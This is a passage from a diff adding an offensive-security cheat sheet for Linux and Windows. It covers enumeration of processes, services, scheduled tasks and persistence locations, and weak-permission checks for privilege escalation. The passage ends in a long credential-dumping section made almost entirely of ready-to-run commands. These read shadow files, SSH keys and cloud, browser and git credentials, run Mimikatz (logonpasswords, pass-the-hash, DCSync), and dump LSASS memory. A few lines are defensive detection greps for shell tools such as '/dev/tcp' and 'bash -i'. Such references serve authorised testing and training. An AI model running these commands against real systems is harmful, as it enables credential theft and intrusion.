+    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
+}
+"@
+
+# Loaded DLLs analysis
+Get-Process | ForEach-Object {
+    $proc = $_
+    try {
+        $modules = $proc.Modules | Where-Object {$_.FileName -match "temp|appdata"} 
+        if ($modules) {
+            Write-Host "Suspicious DLLs in $($proc.Name) (PID: $($proc.Id))"
+            $modules | Select-Object FileName
+        }
+    } catch {}
+}
+
+# Process environment variables
+[System.Diagnostics.Process]::GetProcessesByName("powershell") | ForEach-Object {
+    $proc = $_
+    Write-Host "Process: $($proc.ProcessName) PID: $($proc.Id)"
+    # Note: Direct environment variable access requires specific API calls
+}
+```
+
+**Sysinternals Tools for Process Analysis**
+
+```cmd
+REM Process Explorer (GUI alternative - command export)
+procexp.exe /accepteula
+
+REM Process Monitor
+procmon.exe /accepteula /backingfile output.pml
+
+REM List DLLs loaded by process
+listdlls.exe -p <PID>
+listdlls.exe <process_name>
+
+REM Handle enumeration
+handle.exe -p <PID>
+handle.exe -a -p <process_name>
+
+REM Process tree
+pslist.exe -t
+
+REM Process information
+pslist.exe <process_name>
+pslist.exe -x <PID>  # Threads and memory
+
+REM Strings in process memory
+strings.exe -pid <PID>
+strings.exe -nobanner <executable>
+```
+
+## Service Configuration Analysis
+
+### Linux Service Analysis
+
+**Systemd Service Enumeration**
+
+```bash
+# List all services
+systemctl list-units --type=service
+systemctl list-units --type=service --all
+systemctl list-units --type=service --state=running
+
+# Service status
+systemctl status <service_name>
+systemctl show <service_name>
+
+# Detailed service properties
+systemctl show <service_name> --property=ExecStart
+systemctl show <service_name> --property=User
+systemctl show <service_name> --property=Environment
+systemctl show <service_name> --no-pager
+
+# Service dependencies
+systemctl list-dependencies <service_name>
+systemctl list-dependencies <service_name> --reverse
+
+# Failed services
+systemctl --failed
+systemctl list-units --state=failed
+
+# Service files location
+systemctl cat <service_name>
+systemctl show <service_name> -p FragmentPath
+
+# All service files
+find /etc/systemd/system/ -name "*.service"
+find /usr/lib/systemd/system/ -name "*.service"
+find /lib/systemd/system/ -name "*.service"
+
+# Enabled services
+systemctl list-unit-files --type=service --state=enabled
+systemctl list-unit-files | grep enabled
+
+# Service timers
+systemctl list-timers --all
+
+# Socket units
+systemctl list-sockets --all
+systemctl list-units --type=socket
+
+# Examine service file
+cat /etc/systemd/system/<service_name>.service
+cat /usr/lib/systemd/system/<service_name>.service
+```
+
+**Service Configuration Analysis**
+
+```bash
+# Services running as root
+systemctl show "*" --property=User,MainPID,Id | grep -B2 "User=root"
+
+# Services with writable configurations
+find /etc/systemd/system/ -writable -name "*.service" 2>/dev/null
+find /lib/systemd/system/ -writable -name "*.service" 2>/dev/null
+
+# Services with ExecStart containing suspicious paths
+grep -r "ExecStart.*tmp\|ExecStart.*dev/shm" /etc/systemd/system/ /lib/systemd/system/
+
+# Unmasked services
+systemctl list-unit-files | grep -v masked
+
+# Service override files
+find /etc/systemd/system/ -name "*.d" -type d
+
+# Extract credentials from service files
+grep -r "PASSWORD\|SECRET\|API_KEY\|TOKEN" /etc/systemd/system/ /lib/systemd/system/ 2>/dev/null
+
+# Environment files referenced by services
+grep -r "EnvironmentFile" /etc/systemd/system/ /lib/systemd/system/ | cut -d= -f2 | sort -u
+
+# Services with capabilities
+systemctl show "*" --property=CapabilityBoundingSet,AmbientCapabilities,Id
+```
+
+**SysV Init Scripts**
+
+```bash
+# List init scripts
+ls -la /etc/init.d/
+service --status-all
+
+# Runlevel services
+ls -la /etc/rc*.d/
+chkconfig --list  # RHEL/CentOS
+
+# Update-rc.d services (Debian/Ubuntu)
+find /etc/rc*.d/ -type l -ls
+
+# Service configuration files
+ls -la /etc/default/
+ls -la /etc/sysconfig/  # RHEL/CentOS
+
+# Check specific service
+service <service_name> status
+/etc/init.d/<service_name> status
+```
+
+**Xinetd Services**
+
+```bash
+# Xinetd configuration
+cat /etc/xinetd.conf
+ls -la /etc/xinetd.d/
+cat /etc/xinetd.d/*
+
+# Active xinetd services
+netstat -tlnp | grep xinetd
+ss -tlnp | grep xinetd
+```
+
+**Service Enumeration Script**
+
+```bash
+#!/bin/bash
+# Comprehensive service enumeration
+
+echo "=== Running Services ==="
+systemctl list-units --type=service --state=running --no-pager
+
+echo -e "\n=== Services as Root ==="
+for service in $(systemctl list-units --type=service --state=running --no-legend | awk '{print $1}'); do
+    user=$(systemctl show $service --property=User --value)
+    if [ "$user" == "root" ] || [ -z "$user" ]; then
+        echo "$service: root"
+    fi
+done
+
+echo -e "\n=== Writable Service Files ==="
+find /etc/systemd/system/ /lib/systemd/system/ -writable -name "*.service" 2>/dev/null
+
+echo -e "\n=== Service Environment Files ==="
+grep -rh "EnvironmentFile" /etc/systemd/system/ /lib/systemd/system/ 2>/dev/null | grep -v "^#" | cut -d= -f2 | sort -u
+
+echo -e "\n=== Suspicious Service Paths ==="
+grep -r "ExecStart.*tmp\|ExecStart.*dev/shm\|ExecStart.*/home" /etc/systemd/system/ /lib/systemd/system/ 2>/dev/null
+
+echo -e "\n=== Services with Network Bindings ==="
+systemctl list-sockets --no-pager
+```
+
+### Windows Service Analysis
+
+**PowerShell Service Enumeration**
+
+```powershell
+# List all services
+Get-Service
+Get-Service | Format-Table -AutoSize
+
+# Running services
+Get-Service | Where-Object {$_.Status -eq "Running"}
+
+# Stopped services
+Get-Service | Where-Object {$_.Status -eq "Stopped"}
+
+# Service details with WMI
+Get-WmiObject Win32_Service | Select-Object Name, DisplayName, State, StartMode, PathName, StartName | Format-Table -AutoSize
+
+# Services running as SYSTEM
+Get-WmiObject Win32_Service | Where-Object {$_.StartName -eq "LocalSystem"} | Select-Object Name, PathName
+
+# Services with specific start mode
+Get-WmiObject Win32_Service | Where-Object {$_.StartMode -eq "Auto"} | Select-Object Name, DisplayName, PathName
+
+# Service configuration
+Get-Service <service_name> | Select-Object *
+Get-WmiObject Win32_Service -Filter "Name='<service_name>'" | Select-Object *
+
+# Service dependencies
+Get-Service -Name <service_name> -DependentServices
+Get-Service -Name <service_name> -RequiredServices
+
+# Services with unquoted paths
+Get-WmiObject Win32_Service | Where-Object {$_.PathName -notmatch '^"' -and $_.PathName -match ' '} | Select-Object Name, PathName, StartName
+
+# Services running from writable locations
+Get-WmiObject Win32_Service | ForEach-Object {
+    $path = $_.PathName -replace '"', '' -split ' ' | Select-Object -First 1
+    if (Test-Path $path) {
+        $acl = Get-Acl $path
+        if ($acl.Access | Where-Object {$_.FileSystemRights -match "Write|FullControl" -and $_.IdentityReference -notmatch "SYSTEM|Administrators"}) {
+            [PSCustomObject]@{
+                Name = $_.Name
+                PathName = $_.PathName
+                StartName = $_.StartName
+            }
+        }
+    }
+}
+
+# Services with DLL hijacking potential
+Get-WmiObject Win32_Service | ForEach-Object {
+    $path = ($_.PathName -replace '"', '' -split ' ' | Select-Object -First 1)
+    if ($path -and (Test-Path $path)) {
+        $directory = Split-Path $path
+        try {
+            $acl = Get-Acl $directory
+            $writable = $acl.Access | Where-Object {
+                $_.FileSystemRights -match "Write|FullControl" -and 
+                $_.IdentityReference -match "Users|Everyone|Authenticated Users"
+            }
+            if ($writable) {
+                [PSCustomObject]@{
+                    Service = $_.Name
+                    Path = $path
+                    Directory = $directory
+                    StartName = $_.StartName
+                }
+            }
+        } catch {}
+    }
+}
+
+# Registry service configuration
+Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services" | ForEach-Object {
+    $serviceName = $_.PSChildName
+    $imagePath = (Get-ItemProperty $_.PSPath -Name ImagePath -ErrorAction SilentlyContinue).ImagePath
+    $objectName = (Get-ItemProperty $_.PSPath -Name ObjectName -ErrorAction SilentlyContinue).ObjectName
+    [PSCustomObject]@{
+        Name = $serviceName
+        ImagePath = $imagePath
+        Account = $objectName
+    }
+} | Where-Object {$_.ImagePath}
+
+# Services with clear-text credentials in registry
+Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services" -Recurse | ForEach-Object {
+    Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue | ForEach-Object {
+        $_ | Select-String -Pattern "password|pwd|pass|key" -AllMatches | ForEach-Object {
+            Write-Host "Found in: $($_.Path)"
+            $_
+        }
+    }
+}
+```
+
+**Command Prompt Service Enumeration**
+
+```cmd
+REM List all services
+sc query
+sc query state= all
+net start
+
+REM Service details
+sc qc <service_name>
+sc qdescription <service_name>
+sc qfailure <service_name>
+sc qtriggerinfo <service_name>
+
+REM Service configuration
+sc qc <service_name>
+sc queryex <service_name>
+
+REM Service privileges
+sc qprivs <service_name>
+
+REM Service SID
+sc showsid <service_name>
+
+REM All services detailed
+sc query state= all type= service
+
+REM Services with specific state
+sc query state= inactive
+sc query state= running
+
+REM WMIC service enumeration
+wmic service list brief
+wmic service list full
+wmic service get name,displayname,pathname,startmode,startname
+
+REM Services with specific account
+wmic service where "startname like '%LocalSystem%'" get name,pathname
+
+REM Services with unquoted paths
+wmic service get name,pathname | findstr /i /v "C:\Windows" | findstr /i /v """"
+
+REM Service ACLs
+sc sdshow <service_name>
+
+REM Vulnerable service permissions
+accesschk.exe -uwcqv "Authenticated Users" * /accepteula
+accesschk.exe -uwcqv "Users" * /accepteula
+accesschk.exe -uwcqv "Everyone" * /accepteula
+
+REM Service binary permissions
+accesschk.exe -uwcqv <user> "C:\Path\To\Service.exe"
+
+REM Registry service enumeration
+reg query HKLM\SYSTEM\CurrentControlSet\Services
+reg query HKLM\SYSTEM\CurrentControlSet\Services\<service_name>
+reg query HKLM\SYSTEM\CurrentControlSet\Services\<service_name> /s
+```
+
+**Service Exploitation Checks**
+
+```powershell
+# PowerUp (PowerSploit) service checks
+Import-Module PowerUp.ps1
+Get-ServiceUnquoted -Verbose
+Get-ModifiableServiceFile -Verbose
+Get-ModifiableService -Verbose
+Get-ServiceDetail
+
+# Manual unquoted path check
+Get-WmiObject Win32_Service | Where-Object {
+    $_.PathName -notmatch '^"' -and 
+    $_.PathName -match ' ' -and
+    $_.State -eq 'Running'
+} | ForEach-Object {
+    $path = $_.PathName -split '.exe' | Select-Object -First 1
+    $path = $path + '.exe'
+    Write-Host "Service: $($_.Name)"
+    Write-Host "Path: $path"
+    Write-Host "Account: $($_.StartName)"
+    Write-Host "---"
+}
+
+# Weak service permissions
+$services = Get-WmiObject Win32_Service
+foreach ($service in $services) {
+    try {
+        $sddl = (sc.exe sdshow $service.Name)[1]
+        if ($sddl -match "WD|WO|WA") {  # Write Data, Write Owner, Write ACL
+            Write-Host "Potentially writable service: $($service.Name)"
+            Write-Host "SDDL: $sddl"
+        }
+    } catch {}
+}
+```
+
+## Scheduled Task Discovery
+
+### Linux Scheduled Tasks
+
+**Cron Jobs Enumeration**
+
+```bash
+# System-wide crontab
+cat /etc/crontab
+
+# Cron directories
+ls -la /etc/cron.d/
+ls -la /etc/cron.daily/
+ls -la /etc/cron.hourly/
+ls -la /etc/cron.weekly/
+ls -la /etc/cron.monthly/
+
+# View all cron files
+cat /etc/cron.d/*
+cat /etc/cron.daily/*
+cat /etc/cron.hourly/*
+cat /etc/cron.weekly/*
+cat /etc/cron.monthly/*
+
+# User crontabs
+crontab -l  # Current user
+crontab -u <username> -l  # Specific user
+ls -la /var/spool/cron/crontabs/
+cat /var/spool/cron/crontabs/*
+
+# All user crontabs
+for user in $(cut -f1 -d: /etc/passwd); do 
+    echo "=== Crontab for $user ==="
+    crontab -u $user -l 2>/dev/null
+done
+
+# Cron logs
+grep CRON /var/log/syslog
+grep CRON /var/log/cron
+journalctl -u cron
+
+# Anacron tasks
+cat /etc/anacrontab
+ls -la /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/
+```
+
+**Systemd Timers**
+
+```bash
+# List all timers
+systemctl list-timers --all
+systemctl list-timers --all --no-pager
+
+# Timer details
+systemctl cat <timer_name>
+systemctl status <timer_name>
+systemctl show <timer_name>
+
+# Timer configurations
+find /etc/systemd/system/ -name "*.timer"
+find /lib/systemd/system/ -name "*.timer"
+
+# View timer files
+cat /etc/systemd/system/*.timer
+cat /lib/systemd/system/*.timer
+
+# Associated service for timer
+systemctl list-unit-files | grep timer
+```
+
+**At Jobs**
+
+```bash
+# List at jobs
+atq
+at -l
+
+# View specific at job
+at -c <job_number>
+
+# At job directory
+ls -la /var/spool/at/
+cat /var/spool/at/*
+
+# At daemon status
+systemctl status atd
+```
+
+**Writable Cron Scripts**
+
+```bash
+# Find writable cron scripts
+find /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/ -type f -writable 2>/dev/null
+
+# Scripts in cron directories with weak permissions
+ls -la /etc/cron.daily/ | grep -v "root root"
+ls -la /etc/cron.hourly/ | grep -v "root root"
+
+# Cron jobs running scripts from writable directories
+grep -r "/tmp\|/dev/shm\|/var/tmp\|/home" /etc/cron.d/ /etc/crontab /var/spool/cron/ 2>/dev/null
+
+# World-writable directories in PATH used by cron
+cat /etc/crontab /etc/cron.d/* 2>/dev/null | grep PATH | cut -d= -f2 | tr ':' '\n' | while read dir; do
+    if [ -d "$dir" ] && [ -w "$dir" ]; then
+        echo "Writable PATH directory: $dir"
+        ls -la $dir
+    fi
+done
+```
+
+**Scheduled Task Enumeration Script**
+
+```bash
+#!/bin/bash
+# Comprehensive scheduled task enumeration
+
+echo "=== System Crontab ==="
+cat /etc/crontab 2>/dev/null
+
+echo -e "\n=== Cron Directories ==="
+ls -laR /etc/cron.* 2>/dev/null
+
+echo -e "\n=== User Crontabs ==="
+for user in $(cut -f1 -d: /etc/passwd); do
+    crontab=$(crontab -u $user -l 2>/dev/null)
+    if [ -n "$crontab" ]; then
+        echo "User: $user"
+        echo "$crontab"
+    fi
+done
+
+echo -e "\n=== Systemd Timers ==="
+systemctl list-timers --all --no-pager
+
+echo -e "\n=== At Jobs ==="
+atq 2>/dev/null
+
+echo -e "\n=== Writable Cron Locations ==="
+find /etc/cron.* /var/spool/cron -type f -writable 2>/dev/null
+
+echo -e "\n=== Suspicious Cron Commands ==="
+grep -r "chmod\|wget\|curl\|nc\|bash -i\|sh -i\|/dev/tcp" /etc/cron.* /var/spool/cron/ 2>/dev/null
+
+echo -e "\n=== Cron Jobs with Wildcards ==="
+grep -r "\*" /etc/cron.* /var/spool/cron/ 2>/dev/null | grep -v "^#"
+```
+
+### Windows Scheduled Tasks
+
+**PowerShell Task Enumeration**
+
+```powershell
+# List all scheduled tasks
+Get-ScheduledTask
+Get-ScheduledTask | Format-Table -AutoSize
+
+# Running tasks
+Get-ScheduledTask | Where-Object {$_.State -eq "Running"}
+
+# Enabled tasks
+Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"}
+
+# Task details
+Get-ScheduledTask -TaskName <task_name> | Get-ScheduledTaskInfo
+Get-ScheduledTask -TaskName <task_name> | Select-Object *
+
+# Task actions (what it runs)
+Get-ScheduledTask | ForEach-Object {
+    $task = $_
+    $actions = $task | Get-ScheduledTaskInfo | Select-Object -ExpandProperty Actions
+    [PSCustomObject]@{
+        TaskName = $task.TaskName
+        TaskPath = $task.TaskPath
+        State = $task.State
+        Actions = $actions
+    }
+} | Format-List
+
+# Tasks with specific trigger
+Get-ScheduledTask | Where-Object {$_.Triggers.CimClass.CimClassName -eq "MSFT_TaskLogonTrigger"}
+
+# Tasks running as SYSTEM
+Get-ScheduledTask | ForEach-Object {
+    $task = $_
+    $principal = $task.Principal
+    if ($principal.UserId -match "SYSTEM|S-1-5-18") {
+        [PSCustomObject]@{
+            Name = $task.TaskName
+            Path = $task.TaskPath
+            User = $principal.UserId
+            State = $task.State
+        }
+    }
+}
+
+# Tasks with command line arguments
+Get-ScheduledTask | ForEach-Object {
+    $task = $_
+    $actions = (Get-ScheduledTaskInfo -TaskName $task.TaskName -TaskPath $task.TaskPath).Actions
+    foreach ($action in $actions) {
+        if ($action.Execute -or $action.Arguments) {
+            [PSCustomObject]@{
+                TaskName = $task.TaskName
+                Execute = $action.Execute
+                Arguments = $action.Arguments
+                WorkingDirectory = $action.WorkingDirectory
+            }
+        }
+    }
+} | Format-List
+
+# Tasks from specific paths
+Get-ScheduledTask -TaskPath "\Microsoft\Windows\*" | Select-Object TaskName, TaskPath, State
+
+# Export task XML
+Export-ScheduledTask -TaskName <task_name> -TaskPath "\path\"
+
+# Task history (requires event log)
+Get-WinEvent -LogName Microsoft-Windows-TaskScheduler/Operational | Where-Object {$_.Id -eq 110} | Select-Object TimeCreated, Message
+```
+
+**Command Prompt Task Enumeration**
+
+```cmd
+REM List all scheduled tasks
+schtasks
+schtasks /query
+schtasks /query /fo LIST
+schtasks /query /fo LIST /v
+
+REM Detailed output
+schtasks /query /fo LIST /v > tasks.txt
+
+REM CSV format
+schtasks /query /fo CSV /v
+
+REM Specific task details
+schtasks /query /tn <task_name> /fo LIST /v
+
+REM Tasks on remote computer
+schtasks /query /s <computer> /u <user> /p <password>
+
+REM Filter by state
+schtasks /query /fo LIST | findstr /i "running"
+schtasks /query /fo LIST | findstr /i "ready"
+
+REM Tasks running as SYSTEM
+schtasks /query /fo LIST /v | findstr /i "system"
+
+REM Export task XML
+schtasks /query /tn <task_name> /xml > task.xml
+
+REM Search for suspicious tasks
+schtasks /query /fo LIST /v | findstr /i "powershell cmd script bat vbs"
+schtasks /query /fo LIST /v | findstr /i "temp tmp downloads"
+```
+
+**Registry-Based Task Discovery**
+
+```cmd
+REM Task Scheduler registry keys
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks"
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree"
+
+REM Specific task registry
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks" /s
+
+REM Task paths
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree" /s
+```
+
+**PowerShell Advanced Task Analysis**
+
+```powershell
+# Tasks with writable executables
+Get-ScheduledTask | ForEach-Object {
+    $task = $_
+    $taskInfo = Get-ScheduledTaskInfo -TaskName $task.TaskName -TaskPath $task.TaskPath
+    
+    foreach ($action in $taskInfo.Actions) {
+        if ($action.Execute) {
+            $exePath = $action.Execute -replace '"', ''
+            if (Test-Path $exePath) {
+                $acl = Get-Acl $exePath
+                $writable = $acl.Access | Where-Object {
+                    $_.FileSystemRights -match "Write|Modify|FullControl" -and
+                    $_.IdentityReference -notmatch "SYSTEM|Administrators"
+                }
+                if ($writable) {
+                    [PSCustomObject]@{
+                        TaskName = $task.TaskName
+                        ExecutePath = $exePath
+                        TaskUser = $task.Principal.UserId
+                        Writable = $true
+                    }
+                }
+            }
+        }
+    }
+}
+
+# Tasks running scripts from user-writable locations
+Get-ScheduledTask | ForEach-Object {
+    $task = $_
+    $taskInfo = Get-ScheduledTaskInfo -TaskName $task.TaskName -TaskPath $task.TaskPath
+    
+    foreach ($action in $taskInfo.Actions) {
+        $execute = $action.Execute
+        $args = $action.Arguments
+        if ($execute -match "powershell|cmd|wscript|cscript" -and 
+            ($execute -match "\\Users\\|\\Temp\\|\\AppData\\" -or 
+             $args -match "\\Users\\|\\Temp\\|\\AppData\\")) {
+            [PSCustomObject]@{
+                TaskName = $task.TaskName
+                Execute = $execute
+                Arguments = $args
+                User = $task.Principal.UserId
+            }
+        }
+    }
+}
+
+# Tasks with suspicious triggers
+Get-ScheduledTask | ForEach-Object {
+    $task = $_
+    $triggers = $task.Triggers
+    
+    foreach ($trigger in $triggers) {
+        if ($trigger.CimClass.CimClassName -in @("MSFT_TaskLogonTrigger", "MSFT_TaskRegistrationTrigger", "MSFT_TaskBootTrigger")) {
+            [PSCustomObject]@{
+                TaskName = $task.TaskName
+                TriggerType = $trigger.CimClass.CimClassName
+                State = $task.State
+                User = $task.Principal.UserId
+            }
+        }
+    }
+}
+
+# Extract credentials from task definitions
+Get-ScheduledTask | ForEach-Object {
+    $taskXml = Export-ScheduledTask -TaskName $_.TaskName -TaskPath $_.TaskPath
+    if ($taskXml -match "password|credential") {
+        Write-Host "Potential credentials in: $($_.TaskName)"
+        Write-Host $taskXml
+    }
+}
+
+# Tasks with network actions
+Get-ScheduledTask | ForEach-Object {
+    $task = $_
+    $taskInfo = Get-ScheduledTaskInfo -TaskName $task.TaskName -TaskPath $task.TaskPath
+    
+    foreach ($action in $taskInfo.Actions) {
+        $combined = "$($action.Execute) $($action.Arguments)"
+        if ($combined -match "http|ftp|smb|\\\\|Invoke-WebRequest|wget|curl|Start-BitsTransfer") {
+            [PSCustomObject]@{
+                TaskName = $task.TaskName
+                Action = $combined
+                User = $task.Principal.UserId
+            }
+        }
+    }
+}
+```
+
+**Task File System Analysis**
+
+```cmd
+REM Task files location
+dir C:\Windows\System32\Tasks /s
+dir C:\Windows\Tasks /s
+
+REM Examine task files
+type C:\Windows\System32\Tasks\<task_name>
+
+REM Search for keywords in task files
+findstr /s /i "password script http" C:\Windows\System32\Tasks\*
+findstr /s /i "powershell cmd" C:\Windows\System32\Tasks\*
+
+REM Check ACLs on task files
+icacls C:\Windows\System32\Tasks
+icacls C:\Windows\System32\Tasks\<task_name>
+```
+
+**Startup Tasks and Run Keys**
+
+```powershell
+# Registry Run keys
+Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
+Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
+Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
+
+# All users startup
+Get-ChildItem "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+
+# Current user startup
+Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+
+# WMI Event Subscriptions (persistence)
+Get-WmiObject -Namespace root\subscription -Class __EventFilter
+Get-WmiObject -Namespace root\subscription -Class __EventConsumer
+Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
+
+# All persistence locations
+$runKeys = @(
+    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
+    "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
+    "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnceEx",
+    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
+    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
+    "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
+    "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce"
+)
+
+foreach ($key in $runKeys) {
+    if (Test-Path $key) {
+        Write-Host "`n=== $key ==="
+        Get-ItemProperty $key
+    }
+}
+```
+
+## Credential Dumping
+
+### Linux Credential Dumping
+
+**Password Files**
+
+```bash
+# Shadow file (requires root)
+cat /etc/shadow
+cat /etc/shadow-
+cat /etc/shadow.bak
+
+# Passwd file
+cat /etc/passwd
+cat /etc/passwd-
+
+# Group information
+cat /etc/group
+cat /etc/gshadow
+
+# Backup password files
+ls -la /etc/*shadow* /etc/*passwd*
+cat /var/backups/passwd.bak 2>/dev/null
+cat /var/backups/shadow.bak 2>/dev/null
+
+# Check for world-readable shadow
+ls -la /etc/shadow
+```
+
+**SSH Keys**
+
+```bash
+# Current user SSH keys
+ls -la ~/.ssh/
+cat ~/.ssh/id_rsa
+cat ~/.ssh/id_dsa
+cat ~/.ssh/id_ecdsa
+cat ~/.ssh/id_ed25519
+
+# All users SSH keys
+find / -name "id_rsa" 2>/dev/null
+find / -name "id_dsa" 2>/dev/null
+find / -name "id_ecdsa" 2>/dev/null
+find / -name "id_ed25519" 2>/dev/null
+find /home -name "id_*" 2>/dev/null
+
+# SSH authorized_keys
+cat ~/.ssh/authorized_keys
+find / -name "authorized_keys" 2>/dev/null
+
+# SSH known_hosts
+cat ~/.ssh/known_hosts
+find / -name "known_hosts" 2>/dev/null
+
+# SSH configuration
+cat ~/.ssh/config
+cat /etc/ssh/ssh_config
+cat /etc/ssh/sshd_config
+
+# Private keys with weak permissions
+find / -name "id_*" -o -name "*.pem" -o -name "*.key" 2>/dev/null | while read key; do
+    perms=$(stat -c %a "$key" 2>/dev/null)
+    if [ "$perms" != "600" ] && [ "$perms" != "400" ]; then
+        echo "Weak permissions on: $key ($perms)"
+    fi
+done
+```
+
+**Configuration Files with Credentials**
+
+```bash
+# Database configuration files
+cat /var/www/html/wp-config.php 2>/dev/null
+cat /var/www/html/configuration.php 2>/dev/null
+find /var/www/ -name "config.php" -o -name "database.yml" -o -name ".env" 2>/dev/null
+
+# Application configs
+cat ~/.mysql_history
+cat ~/.psql_history
+cat ~/.bash_history | grep -i "password\|pass\|pwd\|passwd"
+
+# Search for passwords in files
+grep -r "password" /var/www/ 2>/dev/null
+grep -r "DB_PASSWORD" /var/www/ 2>/dev/null
+grep -ri "password=" /etc/ 2>/dev/null
+
+# Common credential locations
+cat /etc/openvpn/auth.txt 2>/dev/null
+cat /etc/ppp/pap-secrets 2>/dev/null
+cat /etc/ppp/chap-secrets 2>/dev/null
+
+# Docker credentials
+cat ~/.docker/config.json 2>/dev/null
+cat /root/.docker/config.json 2>/dev/null
+
+# Cloud credentials
+cat ~/.aws/credentials 2>/dev/null
+cat ~/.azure/credentials 2>/dev/null
+cat ~/.config/gcloud/credentials 2>/dev/null
+
+# Git credentials
+cat ~/.git-credentials 2>/dev/null
+cat ~/.gitconfig 2>/dev/null
+```
+
+**Process Memory Dumping**
+
+```bash
+# Dump process memory (requires root)
+gcore <PID>
+gcore -o output <PID>
+
+# Using gdb
+gdb -p <PID>
+(gdb) generate-core-file
+(gdb) quit
+
+# Dump all process memory
+cat /proc/<PID>/maps
+dd if=/proc/<PID>/mem of=process.dump bs=1 skip=<start_address> count=<size>
+
+# Search memory for strings
+strings /proc/<PID>/mem | grep -i password
+
+# Automated memory search
+for pid in $(ps aux | awk '{print $2}' | grep -v PID); do
+    if [ -r /proc/$pid/environ ]; then
+        echo "=== PID $pid ==="
+        strings /proc/$pid/environ 2>/dev/null | grep -i "pass\|key\|token\|secret"
+    fi
+done
+```
+
+**Mimipenguin (Linux Credential Dumper)**
+
+```bash
+# Download and run mimipenguin
+git clone https://github.com/huntergregal/mimipenguin.git
+cd mimipenguin
+chmod +x mimipenguin.sh
+sudo ./mimipenguin.sh
+
+# Python version
+sudo python3 mimipenguin.py
+```
+
+**Browser Credential Extraction**
+
+```bash
+# Firefox passwords
+find ~ -name "logins.json" 2>/dev/null
+find ~ -name "key4.db" 2>/dev/null
+
+# Chrome/Chromium passwords
+find ~ -name "Login Data" 2>/dev/null
+sqlite3 ~/.config/google-chrome/Default/"Login Data" "SELECT origin_url, username_value, password_value FROM logins"
+
+# Browser history
+find ~ -name "History" 2>/dev/null
+find ~ -name "places.sqlite" 2>/dev/null
+```
+
+**Cached Credentials**
+
+```bash
+# Kerberos tickets
+klist
+find /tmp -name "krb5cc_*" 2>/dev/null
+
+# LDAP credentials
+cat /etc/ldap/ldap.conf
+cat ~/.ldaprc
+
+# NFS exports
+cat /etc/exports
+
+# Samba credentials
+cat /etc/samba/smb.conf
+cat ~/.smbcredentials
+```
+
+### Windows Credential Dumping
+
+**Mimikatz**
+
+```cmd
+REM Run mimikatz
+mimikatz.exe
+
+REM Privilege escalation
+mimikatz # privilege::debug
+mimikatz # token::elevate
+
+REM Dump SAM
+mimikatz # lsadump::sam
+
+REM Dump LSA secrets
+mimikatz # lsadump::secrets
+
+REM Dump credentials from LSASS
+mimikatz # sekurlsa::logonpasswords
+
+REM Dump Kerberos tickets
+mimikatz # sekurlsa::tickets
+
+REM Export tickets
+mimikatz # sekurlsa::tickets /export
+
+REM Pass-the-hash
+mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:cmd
+
+REM Dump cached credentials
+mimikatz # lsadump::cache
+
+REM Dump credential manager
+mimikatz # vault::cred /patch
+
+REM Dump DPAPI secrets
+mimikatz # dpapi::cache
+mimikatz # sekurlsa::dpapi
+
+REM Extract Kerberos encryption keys
+mimikatz # sekurlsa::ekeys
+
+REM DCSync attack (Domain Controller)
+mimikatz # lsadump::dcsync /user:<domain>\<username>
+mimikatz # lsadump::dcsync /domain:<domain> /all
+```
+
+**PowerShell Mimikatz (Invoke-Mimikatz)**
+
+```powershell
+# Import module
+Import-Module .\Invoke-Mimikatz.ps1
+
+# Dump credentials
+Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
+
+# Dump SAM
+Invoke-Mimikatz -Command '"lsadump::sam"'
+
+# Dump LSA
+Invoke-Mimikatz -Command '"lsadump::secrets"'
+
+# Export to file
+Invoke-Mimikatz -DumpCreds -ComputerName @("server1","server2")
+
+# Remote execution
+Invoke-Mimikatz -ComputerName <target>
+```
+
+**LSASS Memory Dump**
+
+```powershell
+# Task Manager method (GUI)
+# Right-click lsass.exe -> Create dump file
+
+# ProcDump (Sysinternals)
+procdump.exe -ma lsass.exe lsass.dmp
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+# PowerShell method
+$process = Get-Process lsass
+$dumpFile = "C:\temp\lsass.dmp"
+[System.Diagnostics.Process]::GetProcessById($process.Id).MiniDumpWriteDump($dumpFile)
+
+# comsvcs.dll method
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\temp\lsass.dmp full
+
+# Get LSASS PID
+tasklist | findstr lsass
+Get-Process lsass | Select-Object Id
+
+# Parse offline with Mimikatz
+mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonpasswords
+
+# Parse with pypykatz
+pypykatz lsa minidump lsass.dmp
+```
+
+**Registry Credential Extraction**
+
+```cmd
+REM Save registry hives
+reg save HKLM\SAM SAM.hive
